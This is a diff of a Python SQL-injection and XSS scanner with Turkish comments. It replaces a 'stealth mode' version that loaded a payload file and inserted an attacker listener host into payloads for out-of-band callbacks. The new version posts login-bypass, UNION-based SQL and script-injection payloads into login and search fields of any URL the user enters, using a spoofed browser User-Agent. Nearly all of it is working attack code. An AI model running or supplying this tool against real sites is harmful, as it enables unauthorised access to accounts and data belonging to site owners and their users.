@@ -1,96 +1,84 @@
 import requests
 import time
 
-def advanced_sqli_scan_v4_1(target_url, payload_file, callback_url=None):
+def scanner_v5(target_url, mode="ALL"):
     print(f"\n{'='*70}")
-    print(f"[*] SQL INJECTION SCANNER v4.1 (STEALTH MODE)")
+    print(f"[*] WEB VULNERABILITY SCANNER v5.0 (SQLi + XSS)")
     print(f"[*] Hedef: {target_url}")
-    print(f"[*] Mod: İLK BULDUĞUNDA DURACAK")
-    if callback_url:
-        print(f"[*] Listener: {callback_url}")
+    print(f"[*] Mod: {mode}")
     print(f"{'='*70}\n")
-
-    try:
-        with open(payload_file, 'r', encoding='utf-8', errors='ignore') as f:
-            payloads = [line.strip() for line in f if line.strip()]
-        print(f"[*] {len(payloads)} adet payload yüklendi. Tarama başlıyor...\n")
-    except FileNotFoundError:
-        print("[HATA] Payload dosyası bulunamadı!")
-        return
 
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
     }
+    
+    # Hedef Inputlar
+    input_fields = ['uname', 'pass', 'user_login', 'user_pass', 'search', 'q', 'query', 'id']
 
-    input_fields = ['uname', 'pass', 'user_login', 'user_pass', 'email', 'user']
-
-    with requests.Session() as s:
-        vuln_found = False
+    # --- 1. MODÜL: SQL INJECTION ---
+    if mode == "ALL" or mode == "SQL":
+        print("[*] SQL Injection Taraması Başlatılıyor...")
+        # Basit ve etkili SQL Payloadları
+        sql_payloads = ["' OR '1'='1", '" OR "1"="1', "admin' --", "' OR 1=1 --", "' UNION SELECT 1,version()--"]
         
-        for i, payload in enumerate(payloads):
-            if vuln_found: break 
+        with requests.Session() as s:
+            for payload in sql_payloads:
+                for field in input_fields:
+                    data = {f: payload if f == field else "test" for f in input_fields}
+                    try:
+                        response = s.post(target_url, data=data, headers=headers, timeout=10)
+                        
+                        # Error Based Kontrolü
+                        errors = ["SQL syntax", "mysql_fetch", "MariaDB", "Welcome", "logout", "user info"]
+                        for err in errors:
+                            if err in response.text:
+                                print(f"[!!!] SQLi BULUNDU! ({err})")
+                                print(f"      Payload: {payload}")
+                                print(f"      Alan: {field}")
+                                return # İlk bulduğunda dur
+                    except: pass
+        print("[-] SQL Taraması Bitti.\n")
 
-            if i % 5 == 0:
-                print(f"[*] Tarama: {i}/{len(payloads)} tamamlandı...", end='\r')
+    # --- 2. MODÜL: XSS (Cross-Site Scripting) ---
+    if mode == "ALL" or mode == "XSS":
+        print("[*] XSS (Reflected) Taraması Başlatılıyor...")
+        
+        # XSS Payloadları (Zararsız Alert kutuları)
+        xss_payloads = [
+            "<script>alert('XSS')</script>",
+            "\"><script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "'><svg/onload=alert(1)>"
+        ]
 
-            current_payload = payload
-            if callback_url and "ATTACKER_HOST" in payload:
-                clean_host = callback_url.replace("http://", "").replace("https://", "").strip("/")
-                current_payload = payload.replace("ATTACKER_HOST", clean_host)
-            elif "ATTACKER_HOST" in payload and not callback_url:
-                continue
-
-            for field in input_fields:
-                if vuln_found: break
-                
-                data = {}
-                for f in input_fields:
-                    data[f] = current_payload if f == field else "test"
-
-                start_time = time.time()
-                
-                try:
-                    response = s.post(target_url, data=data, headers=headers, timeout=20)
-                    duration = time.time() - start_time
-
-                    if duration >= 5:
-                        time_keywords = ['sleep', 'waitfor', 'delay', 'benchmark', 'pg_sleep']
-                        if any(k in current_payload.lower() for k in time_keywords):
-                            print(f"\n\n[!!!] ZAFİYET BULUNDU (Time-Based) - Tarama Durduruluyor.")
-                            print(f"    Payload: {current_payload}")
-                            print(f"    Süre: {round(duration, 2)}sn")
-                            vuln_found = True
-                            break
-
-                    error_indicators = ["SQL syntax", "mysql_fetch", "MariaDB", "ORA-", "syntax error", "Welcome", "Warning", "logout", "Logout", "user info"]
-                    for indicator in error_indicators:
-                        if indicator in response.text:
-                            print(f"\n\n[!] ZAFİYET BULUNDU (Error-Based) - Tarama Durduruluyor.")
-                            print(f"    Payload: {current_payload}")
-                            print(f"    Hata Mesajı: {indicator}")
-                            vuln_found = True
-                            break
-
-                except requests.Timeout:
-                    print(f"\n\n[!!!] ZAFİYET BULUNDU (TIMEOUT) - Tarama Durduruluyor.")
-                    print(f"    Payload: {current_payload}")
-                    vuln_found = True
-                    break
-                except requests.RequestException:
-                    pass
-
-    if vuln_found:
-        print(f"\n[+] Tebrikler! Açık bulundu.")
-    else:
-        print(f"\n[-] Tarama bitti. Hiçbir payload işe yaramadı.")
+        with requests.Session() as s:
+            for payload in xss_payloads:
+                for field in input_fields:
+                    data = {f: payload if f == field else "test" for f in input_fields}
+                    try:
+                        # XSS genelde hem GET hem POST ile çalışır. Önce POST deneyelim.
+                        response = s.post(target_url, data=data, headers=headers, timeout=10)
+                        
+                        # KONTROL: Gönderdiğimiz kod sayfada AYNEN (sansürlenmeden) var mı?
+                        if payload in response.text:
+                            print(f"[!!!] XSS ZAFİYETİ BULUNDU!")
+                            print(f"      Payload: {payload}")
+                            print(f"      Alan: {field}")
+                            print(f"      Not: Tarayıcıda bu kodu girerseniz bir uyarı kutusu çıkar.")
+                            return # İlk bulduğunda dur
+                    except: pass
+        print("[-] XSS Taraması Bitti.")
 
 if __name__ == "__main__":
-    target_input = input("Hedef URL (Örn: http://site.com/login.php): ").strip()
+    target = input("Hedef URL (Örn: http://testphp.vulnweb.com/userinfo.php): ").strip()
+    print("\nMod Seçin: \n1- Sadece SQLi\n2- Sadece XSS\n3- Hepsi (Varsayılan)")
+    choice = input("Seçim: ").strip()
+
+    if choice == "1": mode = "SQL"
+    elif choice == "2": mode = "XSS"
+    else: mode = "ALL"
+
+    if target:
+        scanner_v5(target, mode)
     
-    print("\n[OPSİYONEL] Listener URL'si (Yoksa Enter'a bas):")
-    callback_input = input("Listener: ").strip()
-    
-    if target_input:
-        advanced_sqli_scan_v4_1(target_input, 'payloads.txt', callback_input)
-    
-    input("\nÇıkmak için Enter'a basın...")
+    input("\nÇıkmak için Enter...")
